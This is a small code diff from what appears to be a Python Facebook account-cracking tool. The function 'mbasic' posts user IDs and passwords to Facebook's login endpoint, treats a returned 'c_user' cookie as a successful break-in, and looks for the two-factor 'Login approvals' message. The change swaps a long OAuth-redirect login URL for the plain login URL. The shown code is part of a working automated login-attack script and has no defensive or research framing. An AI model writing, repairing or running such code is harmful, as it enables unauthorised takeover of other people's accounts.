@@ -1309,7 +1309,7 @@ def mbasic(uid,pwx,tl):
             'x-requested-with': 'XMLHttpRequest',
             'x-response-format': 'JSONStream',}
             twf = "Login approval"+"s are on. "+"Expect an SMS"+" shortly with "+"a code to use"+" for log in"
-            url = "https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&next=https%3A%2F%2Fwww.facebook.com%2Fv16.0%2Fdialog%2Foauth%3Fstate%3D6c568e14-bef9-47ee-b853-007ad314f5e1%26scope%3Demail%252Copenid%252Cpublic_profile%26response_type%3Dcode%26client_id%3D525265914179580%26redirect_uri%3Dhttps%253A%252F%252Fwww.canva.com%252Foauth%252Fauthorized%252Ffacebook%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D904e9ab1-6eb1-4276-a9ee-df43d2a60f53%26tp%3Dunspecified%26cbt%3D1729676799432&lwv=100"
+            url = "https://www.facebook.com/login/device-based/regular/login/"
             po = Session.post(url, data=data, headers=headers).text
             response = Session.cookies.get_dict().keys()
             if "c_user" in response:
